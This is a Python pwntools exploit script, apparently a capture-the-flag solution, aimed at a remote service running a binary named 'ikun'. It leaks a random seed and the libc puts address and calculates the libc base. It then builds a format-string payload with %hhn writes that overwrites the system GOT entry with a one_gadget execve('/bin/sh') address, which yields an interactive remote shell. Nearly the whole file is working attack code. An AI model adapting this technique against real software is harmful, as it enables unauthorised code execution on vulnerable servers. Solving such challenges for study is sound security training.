from pwn import *
import binascii
context.log_level = 'debug'
# p=process('./ikun')
p=remote("10.81.2.235",10044)
libc=ELF('./libc-2.27.so')
# gdb.attach(p)
pause()
p.recvuntil(b'please enter your name first: \n')
p.send(b'kunqqqqqqqqq')
p.recvuntil(b'kunqqqqqqqqq')
seed=p.recv(4)
print("my seed",u32(seed))
moves=input("输入动作")
# 判断moves第100个字符是不是c，如果是c就改成t，如果不是就改成c
# new_s='cctlrctcttlttcrlcrrllrcrtrllctrltlrlclctclrrlctlllrrtrcrcltcccltlttlttctcllllcrrlcccrcrlcclcclrlclltcllcrrlrltcrtt'
if moves[99]=='c':
    new_s = moves[:99] + 't' + moves[100:]
else:
    new_s = moves[:99] + 'c' + moves[100:]
# for i in range(114):
#     p.recvuntil(b'Guess the movement KunKun will do:(c/t/r/l)\n')
#     p.sendline(new_s[i].encode())
p.send(new_s.encode())
p.recvuntil(b'A gift for you. The puts addr is: ')
puts_addr=p.recv(6)
#字符串转地址
puts_addr=binascii.hexlify(puts_addr[::-1])
print("puts_addr",puts_addr)
libcbase=int(puts_addr,16)-libc.sym['puts']
print("libcbase",hex(libcbase))
# p.interactive()
# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

one_gadget=libcbase+0xf1247
print('one_gadget',hex(one_gadget))
print(one_gadget%256,one_gadget//256%256)
one=one_gadget%256
two=one_gadget//256%256-one
three=one_gadget//256//256%256-one-two
if two<0:
    two=256+two
if three<0:
    three=256+three
print(one,two,three)
p.recvuntil(b'say something for our KunKun!\n')
# p.interactive()
# di12个参数
system_got=0x602028
payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%17$hhn%'+bytes(str(two), encoding='utf-8')+b'c%18$hhn%'+bytes(str(three), encoding='utf-8')+b'c%21$hhn%').ljust(40,b'k')+p64(system_got)+p64(system_got+1)+p64(0)+p64(0)+p64(system_got+2)
# payload=(b'%'+bytes(str(one), encoding='utf-8')+b'c%15$hhn%').rjust(24,b'k')+p64(system_got)
print('payload',payload)
pause()
# p.interactive()
p.sendline(payload)
# p.recvuntil(b'kk')

p.interactive()